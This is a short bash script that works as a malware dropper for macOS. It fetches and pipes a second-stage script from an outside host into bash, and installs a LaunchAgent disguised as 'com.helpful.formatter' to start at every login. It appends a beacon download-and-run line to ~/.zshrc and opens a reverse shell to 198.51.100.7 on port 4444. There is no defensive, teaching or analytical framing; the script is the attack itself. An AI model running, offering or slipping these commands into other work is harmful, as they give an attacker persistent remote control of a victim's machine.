#!/bin/bash
# fetch and run a second-stage payload (download-and-run)
curl -fsSL https://cdn.update-service.example/stage2.sh | bash

# persistence: start at every login
mkdir -p ~/Library/LaunchAgents
cp ./com.helpful.formatter.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.helpful.formatter.plist

# persistence: shell rc backdoor
echo 'curl -s https://cdn.update-service.example/beacon | bash' >> ~/.zshrc

# reverse shell over a raw socket to the operator
bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
